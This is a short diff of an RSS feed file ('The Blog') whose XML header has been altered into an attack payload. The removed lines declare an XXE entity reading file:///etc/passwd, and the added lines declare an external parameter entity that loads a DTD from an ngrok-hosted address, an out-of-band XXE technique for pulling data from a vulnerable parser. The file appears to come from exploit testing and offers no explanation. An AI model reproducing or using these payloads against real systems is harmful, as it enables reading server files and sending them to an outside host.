@@ -1,6 +1,7 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE title [ <!ELEMENT title ANY >
-<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<!DOCTYPE root [
+<!ENTITY % ext SYSTEM "https://773f-2405-201-684a-3810-ec24-258c-3827-57bf.ngrok-free.app/x"> %ext;
+]>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
 <channel>
     <title>The Blog</title>
